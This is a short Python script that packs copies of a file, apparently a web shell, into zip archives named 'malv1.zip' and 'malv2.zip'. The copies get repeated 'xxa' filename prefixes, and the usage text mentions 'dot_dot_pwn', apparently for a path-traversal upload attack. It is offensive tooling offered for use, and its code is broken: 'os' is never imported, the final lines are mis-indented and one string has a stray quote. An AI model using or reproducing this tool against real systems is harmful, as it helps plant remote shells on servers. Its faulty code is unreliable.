from  sys import argv,exit
try :
  file_name = argv[1]
  lenght = int(argv[2])
  with open(file_name,"rb") as f:
      pshell = f.read()
except:
  print("[-] give valid file path\n usage sprayer.py <file_path> <number_of_dot_dot_pwn>")
  exit(0)
spray = "xxa"
for i in range(1,lenght):
  with open(spray*i+file_name,"wb") as f:
    f.write(pshell)
 os.system("zip -0 malv1.zip xxa*") 
 os.system(""zip malv2.zip xxa*") 
 print("[+] done > malv1.zip - malv2.zip")
 
 
  
